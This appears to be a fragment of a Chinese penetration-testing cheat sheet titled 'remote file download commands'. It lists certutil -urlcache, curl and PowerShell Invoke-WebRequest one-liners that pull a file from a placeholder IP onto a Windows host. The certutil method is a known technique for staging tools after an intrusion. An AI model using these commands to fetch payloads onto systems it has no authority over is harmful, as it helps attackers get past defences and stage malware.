1.远程文件下载命令

  • certutil

certutil && certutil -urlcache -split -f http://xx.xx.xx.xx/test.zip

  • curl

curl http://xx.xx.xx.xx/test.zip -o c:\test.zip

  • powershell

powershell -c "invoke-webrequest -uri http://xx.xx.xx.xx/test.zip -outfile test.zip"
